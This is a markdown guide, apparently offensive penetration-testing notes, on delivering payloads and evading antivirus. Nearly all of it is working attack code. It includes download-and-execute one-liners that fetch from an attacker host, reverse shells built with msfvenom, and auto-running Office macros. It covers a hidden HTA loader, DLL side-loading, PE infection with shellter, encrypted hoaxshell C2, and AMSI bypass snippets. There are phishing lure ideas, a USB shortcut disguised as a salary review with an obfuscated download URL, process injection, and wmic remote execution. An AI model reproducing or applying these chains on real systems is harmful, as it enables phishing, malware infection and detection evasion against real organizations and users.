# Payload Delivery and Evasion Guide

> Techniques for delivering payloads to target systems and evading basic antivirus detection. Covers web delivery, HTA applications, Office macros, DLL side-loading, shellter PE injection, hoaxshell encrypted shells, and encoding strategies.

## Introduction

Generating a functional payload is only half the challenge — delivering it to the target without being blocked by antivirus, email gateways, web proxies, or application whitelisting requires careful selection of delivery mechanism and evasion technique. This guide covers the primary delivery vectors used in penetration testing engagements, from simple HTTP delivery to more sophisticated techniques like PE injection and encrypted C2 channels. Each technique includes the specific scenarios where it is effective, its detection risk, and step-by-step implementation.

The key principle is matching the delivery mechanism to the target environment. A heavily monitored corporate network with SSL inspection and email sandboxing requires different approaches than a directly exposed web server. Start with the simplest delivery method that works, then escalate sophistication as defenses are encountered.

---

## 1. Web Delivery Techniques

### Python HTTP Server

```bash
# Start HTTP server in directory containing payloads
python3 -m http.server 8080

# Target download — Linux (curl)
curl http://10.0.0.1:8080/shell.elf -o /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf

# Target download — Linux (wget)
wget http://10.0.0.1:8080/shell.elf -O /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf

# Target download — Windows (PowerShell)
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadFile('http://10.0.0.1:8080/shell.exe','$env:TEMP\shell.exe');Start-Process $env:TEMP\shell.exe"

# Target download — Windows (certutil)
certutil -urlcache -split -f http://10.0.0.1:8080/shell.exe shell.exe && shell.exe

# Target download — Windows (bitsadmin)
bitsadmin /transfer dl http://10.0.0.1:8080/shell.exe C:\Temp\shell.exe && C:\Temp\shell.exe
```

HTTP delivery is the simplest method and works well when the target can make outbound HTTP connections. Limitations: plain HTTP is visible to network monitoring and proxy logs. For better opsec, serve payloads over HTTPS with a self-signed certificate.

### Metasploit Web Delivery (No File on Disk)

```bash
# PowerShell web delivery — generates one-liner for target
msfconsole -q -x "use exploit/multi/script/web_delivery; set TARGET 2; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; set SRVPORT 8080; exploit"

# Python web delivery
msfconsole -q -x "use exploit/multi/script/web_delivery; set TARGET 0; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit"

# The module generates a one-liner like:
# powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1:8080/xxx')"
```

Web delivery avoids writing a file to disk — the payload is downloaded and executed directly in memory. This technique bypasses file-based AV scanning but is caught by AMSI (Anti-Malware Scan Interface) on Windows 10+ and behavioral monitoring that flags PowerShell download-and-execute patterns.

---

## 2. HTA (HTML Application) Delivery

```bash
# Generate HTA payload with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f hta-psh -o evil.hta

# Serve via HTTP
python3 -m http.server 8080

# Target executes via mshta.exe (built into Windows)
# mshta http://10.0.0.1:8080/evil.hta

# Alternative: Metasploit HTA server
msfconsole -q -x "use exploit/windows/misc/hta_server; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set SRVPORT 8080; exploit"
```

HTA files are HTML applications executed by `mshta.exe`, a built-in Windows component. They bypass many file-type restrictions because `.hta` is not commonly filtered by email gateways or web proxies. The `mshta.exe` process executes the embedded PowerShell code, which then downloads and runs the payload. Detection risk: `mshta.exe` making network connections is a known indicator of compromise (IoC) monitored by EDR solutions.

---

## 3. Office Macro Delivery

```bash
# Generate VBA macro payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f vba-psh -o macro.txt

# Manual VBA shell launcher (paste into Word/Excel VBA editor via Alt+F11 -> ThisDocument)
Sub AutoOpen()
    Shell "powershell -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1:8080/shell.ps1')""", vbHide
End Sub

# Word macro with encoded command
Sub Document_Open()
    Dim cmd As String
    cmd = "powershell -nop -w hidden -enc <BASE64_COMMAND>"
    Shell cmd, vbHide
End Sub

# Excel macro variant
Sub Workbook_Open()
    AutoOpen
End Sub
```

Macro delivery works by embedding VBA code in an Office document (Word, Excel, PowerPoint). When the document is opened with macros enabled, the VBA code executes a PowerShell command that downloads and runs the payload. Modern Microsoft Office versions disable macros from internet sources by default (Mark of the Web), reducing effectiveness. For testing, the document must be saved with a `.docm` or `.xlsm` extension and the target must explicitly enable macros.

---

## 4. DLL Side-Loading

```bash
# Generate DLL payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o version.dll

# Place version.dll in the same directory as a legitimate application
# Many applications load version.dll at startup without verifying the path

# Common DLL hijacking targets:
# version.dll, uxtheme.dll, msdtc.dll, dbgeng.dll, nvapi64.dll
# Research the specific application's DLL load order for best results

# Start listener
nc -lvnp 4444
```

DLL side-loading (also called DLL hijacking or DLL pre-loading) exploits the Windows DLL search order. When an application loads a DLL by name without specifying a full path, Windows searches the application directory first. By placing a malicious DLL with the same name in the application directory, the application loads the attacker's DLL instead of the legitimate system DLL. This technique is effective because the malicious code executes within the context of a trusted application, bypassing application whitelisting.

---

## 5. Shellter PE Injection

```bash
# Interactive shellter injection
shellter -i
# Follow prompts: select target executable, choose payload type, set LHOST/LPORT

# Non-interactive injection
shellter -i -f /usr/share/windows-binaries/plink.exe -p 1 -lhost 10.0.0.1 -lport 4444

# Custom shellcode injection (more control)
# Step 1: Generate raw shellcode
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shellcode.bin
# Step 2: Inject with shellter
shellter -i -f legit.exe -p 2 -s shellcode.bin

# Verify injection (file should still execute normally)
wine legit.exe  # Test in isolated environment
```

Shellter is a dynamic PE infector that injects shellcode into legitimate Windows executables while preserving the original functionality. Unlike msfvenom's template injection (`-x` flag), shellter modifies the PE structure at the assembly level, making detection significantly harder. It supports both automatic payload selection (metasploit payloads) and custom shellcode injection. The injected executable runs its original code and the shellcode, making it appear legitimate to users and basic AV checks.

**Key shellter features**:
- Automatic PE infection without breaking the original executable
- Supports both x86 and x64 PE files
- Polymorphic code injection makes each output unique
- Stealth mode to minimize behavioral indicators

---

## 6. HoaxShell Encrypted Shells

```bash
# Install hoaxshell
pip3 install hoaxshell
# or
git clone https://github.com/t3l3machus/hoaxshell /opt/hoaxshell

# Start hoaxshell server (generates PowerShell one-liner)
hoaxshell -s -i 10.0.0.1 -p 4443 -t powershell

# hoaxshell generates a self-contained command:
# - Uses HTTPS for encrypted communication
# - No file drops on target (memory-only execution)
# - Unique session ID for each connection
# - Built-in auto-reconnect capability

# List active sessions
hoaxshell --list-sessions

# Interact with specific session
hoaxshell --interact <session_id>

# Stop specific session
hoaxshell --stop <session_id>
```

hoaxshell creates an encrypted reverse shell over HTTPS that evades network monitoring. Unlike traditional reverse shells that use raw TCP or unencrypted protocols, hoaxshell tunnels commands through HTTPS requests, making the traffic indistinguishable from normal web browsing. The PowerShell delivery command is self-contained — no files are written to disk, and the shell maintains itself in memory. The built-in auto-reconnect feature handles temporary network disruptions without dropping the session.

**Advantages over traditional shells**:
- Traffic appears as normal HTTPS (encrypted, not inspectable by most proxies)
- No disk artifacts (memory-only execution)
- Auto-reconnect handles network interruptions
- Unique session IDs prevent session hijacking
- Built-in encoding avoids plain-text command visibility

---

## 7. Basic AV Bypass Strategy

The following layered approach maximizes evasion probability:

```bash
# Layer 1: Start with shellter-injected executable
shellter -i -f legit.exe -p 1 -lhost 10.0.0.1 -lport 4444

# Layer 2: If shellter is not available, use multi-encoder chain
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -i 3 -f raw | \
  msfvenom -p - -e x64/zutto_dekiru -i 3 -f exe -o payload.exe

# Layer 3: Use hoaxshell for encrypted C2 to evade network detection
hoaxshell -s -i 10.0.0.1 -p 4443 -t powershell

# Layer 4: Deliver via HTA or macro rather than direct executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f hta-psh -o delivery.hta
```

**Decision flow for AV bypass**:
1. Is file-on-disk acceptable? Yes -> shellter injection into legitimate PE. No -> web_delivery or hoaxshell (memory-only).
2. Is PowerShell available? Yes -> encoded PowerShell delivery. No -> use HTA or DLL side-loading.
3. Is network monitoring present? Yes -> hoaxshell encrypted shell over HTTPS. No -> standard reverse shell.
4. Are macros enabled on target? Yes -> Office macro delivery. No -> HTA or direct executable.

---

## References

- [Shellter Project](https://www.shellterproject.com/)
- [HoaxShell GitHub](https://github.com/t3l3machus/hoaxshell)
- [HackTricks - Payload Delivery](https://book.hacktricks.xyz/generic-methodologies-and-resources/phishing-methodology)
- [MITRE ATT&CK - Initial Access](https://attack.mitre.org/tactics/TA0001/)
- [Metasploit Web Delivery](https://docs.metasploit.com/docs/using-metasploit/exploitation/web-delivery.html)
- [DLL Side-Loading (MITRE T1574.002)](https://attack.mitre.org/techniques/T1574/002/)

---

## 8. Social Engineering Delivery Techniques

### Phishing Payload Construction

Phishing remains one of the most effective initial access vectors. Payload construction for phishing requires careful attention to document appearance, macro reliability, and lure credibility.

```bash
# Generate Office macro with encoded PowerShell payload
# Step 1: Create the PowerShell one-liner that downloads and executes
PS_CMD='IEX(New-Object Net.WebClient).DownloadString("http://10.0.0.1:8080/shell.ps1")'
ENCODED=$(echo -n "$PS_CMD" | iconv -t utf-16le | base64 -w0)

# Step 2: Generate VBA macro with encoded command
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f vba-psh -o macro_encoded.txt

# Step 3: Create the delivery document
# Use a legitimate document template matching the lure
# Common lure types:
# - Financial reports (quarterly earnings, budget reviews)
# - HR documents (policy updates, benefits enrollment)
# - IT notifications (password reset, VPN update)
# - Shipping notifications (delivery confirmation, tracking)
```

### HTA Advanced Delivery

```bash
# Custom HTA with multiple fallback mechanisms
cat > delivery.hta << 'HTAEOF'
<html>
<head>
<HTA:APPLICATION ID="update" APPLICATIONNAME="SystemUpdate" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize">
</head>
<script language="VBScript">
Sub Window_OnLoad
  Set shell = CreateObject("WScript.Shell")
  ' Primary payload via PowerShell
  shell.Run "powershell -nop -w hidden -enc <BASE64_PAYLOAD>", 0, False
  ' Close HTA window immediately
  window.close
End Sub
</script>
</html>
HTAEOF

# Serve HTA with matching landing page
python3 -m http.server 8080
# Delivery URL: mshta http://10.0.0.1:8080/delivery.hta
# Or embed in phishing email as attachment
```

### USB Drop Payload Construction

```bash
# Create a USB drop payload that autoruns when inserted
# Note: Modern Windows disables autorun by default, but social engineering
# can convince the user to open the file manually

# Step 1: Create the autorun.inf (for older systems)
cat > /mnt/usb/autorun.inf << 'EOF'
[autorun]
open=update.exe
icon=shell32.dll,3
label=USB Drive
EOF

# Step 2: Create a legitimate-looking shortcut (LNK) file
# Use a shortcut that appears as a document but executes a payload
# Create with PowerShell:
powershell -c "
\$ws = New-Object -ComObject WScript.Shell
\$sc = \$ws.CreateShortcut('H:\Salary_Review_2024.lnk')
\$sc.TargetPath = 'powershell.exe'
\$sc.Arguments = '-nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(chr(39)+chr(104)+chr(116)+chr(116)+chr(112)+chr(58)+chr(47)+chr(47)+chr(49)+chr(48)+chr(46)+chr(48)+chr(46)+chr(48)+chr(46)+chr(49)+chr(47)+chr(115)+chr(104)+chr(101)+chr(108)+chr(108)+chr(46)+chr(112)+chr(115)+chr(49)+chr(39))\"'
\$sc.IconLocation = 'shell32.dll,70'
\$sc.Save()
"

# Step 3: Add a convincing document file alongside
# The user sees Salary_Review_2024.lnk with a folder icon
# Double-clicking executes the PowerShell payload
```

## 9. AMSI Bypass Techniques

The Anti-Malware Scan Interface (AMSI) in Windows 10+ intercepts PowerShell scripts before execution, sending content to the AV engine for inspection. AMSI bypasses are required for PowerShell-based payloads in modern Windows environments.

### Common AMSI Bypass Methods

```powershell
# Method 1: Force AMSI initialization failure
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2: Patch AMSI context in memory
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext','NonPublic,Static')
$c=$a.GetField('amsiSession','NonPublic,Static')
$b.SetValue($null,[IntPtr]::Zero)
$c.SetValue($null,$null)

# Method 3: Unhook AMSI DLL (more robust against updates)
$kernel32 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]public static extern IntPtr GetModuleHandle(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,UInt32 n,[Ref]UInt32 o);' -Name K -Passthrough)::GetModuleHandle('amsi.dll'),(Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);' -Name K2 -Passthrough)::GetProcAddress((Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetModuleHandle(string n);' -Name K3 -Passthrough)::GetModuleHandle('amsi.dll'),'AmsiScanBuffer'))
```

### AMSI Bypass Delivery Integration

```bash
# Integrate AMSI bypass into payload delivery chain
# The AMSI bypass must execute BEFORE the malicious payload

# Generate combined delivery script:
cat > amsi_bypass_payload.ps1 << 'PSEOF'
# AMSI bypass (must come first)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Payload (executes after AMSI is disabled)
IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1:8080/shell.ps1')
PSEOF

# Encode the combined script for delivery
ENCODED=$(cat amsi_bypass_payload.ps1 | iconv -t utf-16le | base64 -w0)
echo "powershell -nop -enc $ENCODED"
```

## 10. Advanced Evasion Techniques

### Process Injection

```bash
# Using metasploit meterpreter for process injection (post-exploitation)
# After catching a meterpreter session:
meterpreter> migrate -N explorer.exe
# Migrates the meterpreter session into the explorer.exe process
# This removes the original payload process from memory

# Using migrate with specific PID
meterpreter> ps  # List processes
meterpreter> migrate 1234  # Migrate to PID 1234

# Automatic migration via multi/handler AutoRunScript
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
  set LHOST 10.0.0.1; set LPORT 4444; \
  set AutoRunScript post/windows/manage/migrate; \
  exploit"
```

### Reflective DLL Injection

```bash
# Generate a reflective DLL for injection into running processes
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f dll -o reflective.dll

# Inject using metasploit inject payload
# After establishing a session:
meterpreter> use inject
meterpreter> inject -p 1234 -d reflective.dll

# Alternative: use PowerShell for reflective injection
# Generate PowerShell stager with reflection
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -f psh-reflection -o reflective.ps1
# The reflection format loads the payload entirely in memory without touching disk
```

### Living Off The Land (LOTL) Delivery

```cmd
# Certutil download + execute (commonly available on Windows)
certutil -urlcache -split -f http://10.0.0.1/payload.exe C:\Windows\Temp\update.exe
C:\Windows\Temp\update.exe

# Bitsadmin for stealthy background download
bitsadmin /transfer dl /priority low http://10.0.0.1/payload.exe C:\Windows\Temp\svchost.exe

# Mshta for HTA execution (no file save needed)
mshta http://10.0.0.1:8080/payload.hta

# WMI for remote execution (no PowerShell logging)
wmic /node:target /user:admin /password:pass process call create "cmd /c certutil -urlcache -split -f http://10.0.0.1/payload.exe C:\temp\p.exe && C:\temp\p.exe"

# MSBuild for C# inline execution (bypasses PowerShell restrictions)
# Create an inline task CSProj file that contains the payload code
# Execute with: msbuild payload.csproj
```
